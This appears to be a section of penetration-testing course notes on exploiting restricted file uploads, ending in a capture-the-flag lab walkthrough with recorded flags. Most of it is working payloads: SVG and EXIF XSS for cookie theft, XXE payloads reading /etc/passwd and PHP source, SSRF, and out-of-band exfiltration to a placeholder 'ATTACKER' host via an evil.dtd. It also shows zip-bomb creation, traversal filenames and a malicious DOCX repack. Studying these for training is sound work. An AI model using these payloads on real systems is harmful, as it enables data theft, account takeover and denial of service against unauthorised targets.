# Section 8 — Limited File Uploads (Non-Arbitrary)

---

## When You Can't Get Arbitrary Upload

Even when an upload is tightly restricted to a specific file type, certain formats are inherently exploitable because they contain **executable or interpretable content**:

| Allowed type | Attack |
|--------------|--------|
| HTML | Stored XSS, CSRF, phishing |
| SVG | Stored XSS (JS in `<script>`) + XXE (XML entities) |
| XML | XXE + SSRF |
| DOCX / XLSX / PPTX | XXE (XML inside ZIP — modify `word/document.xml`) |
| PDF | XXE (PDFs contain XML metadata) + JS execution in some viewers |
| JPG / PNG / GIF | XSS via EXIF metadata (Comment, Artist fields) |
| ZIP | Zip-slip path traversal, decompression bomb, DoS |
| TIFF | LibTIFF CVE exploits |

---

## Stored XSS via SVG

SVG is XML — `<script>` tags execute when the browser renders it.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <rect x="1" y="1" width="1" height="1" fill="green" />
  <script type="text/javascript">alert(document.cookie);</script>
</svg>
```

Upload, then any user who views it triggers JS in the site's origin → cookie theft, account takeover.

> SVG XSS only fires when served with `Content-Type: image/svg+xml`. If the server forces `Content-Type: application/octet-stream`, the browser downloads instead of renders.

---

## XSS via Image EXIF (`exiftool`)

When the app displays image metadata:

```bash
exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' photo.jpg
exiftool -Artist='<script>alert(1)</script>' photo.jpg
```
> Writes a cross-site scripting (XSS) payload into the image metadata fields. If the site displays the Comment or Artist field in HTML, the script runs in the viewer's browser.

Anywhere the comment/artist field is rendered → XSS fires.

Bonus: change MIME to `text/html` via Content-Type header — some servers serve the image as HTML and trigger XSS even without a metadata viewer.

---

## XXE via SVG

This is the **gold attack** when only SVG is allowed.

### Read local files
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```
> When the server parses this SVG, `&xxe;` resolves to the file's contents and appears in the rendered output. Works when the server uses an XML parser to process SVG files.

When the server parses + renders the SVG, `&xxe;` resolves to the file's contents → embedded in the rendered output.

### Read PHP source via wrapper
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```
> The `php://filter` wrapper base64-encodes the file so it survives XML parsing. Decode the output with `base64 -d` to read the raw PHP source.

The wrapper base64-encodes the file content so it survives XML parsing without breaking. Decode the result with `base64 -d`.

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://internal-service:8080/admin"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
```
> Uses XML External Entity (XXE) to make the server send a request to an internal address. This is Server-Side Request Forgery (SSRF) — useful for hitting internal services not reachable from the internet.

### Out-of-Band XXE (when entity body isn't reflected)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
<svg xmlns="http://www.w3.org/2000/svg">&exfil;</svg>
```
> Out-of-band XXE exfiltrates data to your server when the response does not reflect the entity value. The server fetches your `evil.dtd` file and then sends a request containing the stolen file contents.

Where `evil.dtd` on your server contains:
```xml
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
%all;
```
> The external Document Type Definition (DTD) builds the exfiltration entity dynamically. Host this on your attacker machine and watch for inbound requests containing the file contents.

---

## DoS Attacks via Upload

### Decompression bomb (zip bomb)
```bash
# Create 1MB file
dd if=/dev/zero bs=1M count=1 > big
# Zip it recursively
zip bomb.zip big
zip bomb2.zip bomb.zip
zip bomb3.zip bomb2.zip
# Repeat — final ~10KB → unzipped petabytes
```
> Creates a zip bomb by nesting compressed files. A tiny file unzips into enormous data, crashing the server if it tries to decompress without size limits.

### Pixel flood (image format DoS)
Manually edit a JPG/PNG's dimensions header to claim 65535×65535 pixels. When the server's image library tries to allocate buffer space, it crashes.

### Large file upload
If no size limit: upload many GB → fill disk → crash.

### Path traversal in filename
```
filename=../../../etc/cron.d/x
filename=../../../var/www/html/.htaccess
```

When upload code does `move_uploaded_file($tmp, "/uploads/" . $name)`, naive code lets the traversal escape the upload dir.

---

## XXE via Office Documents (DOCX/XLSX)

DOCX is just a ZIP of XML files. Edit `word/document.xml` inside:

```bash
unzip doc.docx -d doc_dir
# Add to doc_dir/word/document.xml at the top:
#   <!DOCTYPE w:wordDocument [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Reference &xxe; somewhere in the body
cd doc_dir && zip -r ../malicious.docx .
```
> Unpacks the DOCX (which is just a ZIP of XML files), injects an XXE payload into the document XML, then repacks it. Any server that parses the document for a preview will trigger the XXE.

Upload + any office-doc viewer / preview that parses XML → XXE fires.

---

## Lab — XXE via SVG

**Target:** `154.57.164.75:30664`

Form analysis:
```html
<input type="file" name="uploadFile" accept=".svg">
```

Strict whitelist for SVG only. But SVG = XML = XXE.

### Q1 — Read /flag.txt

```bash
cat > /tmp/flag.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
EOF

curl -sk -X POST "http://154.57.164.75:30664/upload.php" -F "uploadFile=@/tmp/flag.svg"

# The main page renders the most recent SVG — entity resolves on render
curl -sk "http://154.57.164.75:30664/" | grep -oE 'HTB\{[^}]+\}'
# → HTB{my_1m4635_4r3_l37h4l}
```
> Creates an SVG with an XXE payload reading `/flag.txt`. The main page renders the SVG and the entity resolves to the file contents. `grep -oE` extracts just the flag string from the HTML.

**Q1 Answer:** `HTB{my_1m4635_4r3_l37h4l}`

### Q2 — Find uploads directory in upload.php source

```bash
cat > /tmp/source.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
EOF

curl -sk -X POST "http://154.57.164.75:30664/upload.php" -F "uploadFile=@/tmp/source.svg"

# Get base64 from main page render + decode
curl -sk "http://154.57.164.75:30664/" | grep -oP 'PD9w[A-Za-z0-9+/=]+' | tail -1 | base64 -d
```
> Reads the upload.php source via a `php://filter` XXE payload. The base64 string starting with `PD9w` is the encoded PHP opening tag (`<?ph`). Decode it to see the full source code including the upload directory path.

Result:
```php
<?php
$target_dir = "./images/";   ← uploads directory
$fileName = basename($_FILES["uploadFile"]["name"]);
...
if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
}
...
```

**Q2 Answer:** `./images/`

---

## Exam Notes

- **SVG = XML** — anywhere SVG is accepted, XXE is on the table
- The two killer SVG XXE patterns: `file://` for direct read, `php://filter/convert.base64-encode/resource=` for binary-safe PHP source disclosure
- `&xxe;` placement matters — it must appear inside SVG content that gets rendered (e.g., between tags, in a `<text>` element)
- The server must **parse the SVG XML** for XXE to fire — usually happens when the SVG is rendered server-side (PHP `SimpleXMLElement`, image conversion via ImageMagick/librsvg) OR when displayed on a page that processes the file
- Some servers serve raw SVG without parsing → XXE only fires in the **viewer's browser**, which won't follow `file://` for security — so XXE-via-SVG-XSS works but `file://` doesn't
- PHP source disclosure via `php://filter/convert.base64-encode/resource=FILE` is the same technique as the LFI module
- For DOCX/XLSX: unzip → edit XML → re-zip. The actual XXE payload is identical.
- exiftool XSS (`-Comment`/`-Artist`) is the cheapest stored XSS when only image uploads are allowed
- ImageMagick + SVG = "ImageTragick" (CVE-2016-3714) — historical RCE; check version on real engagements
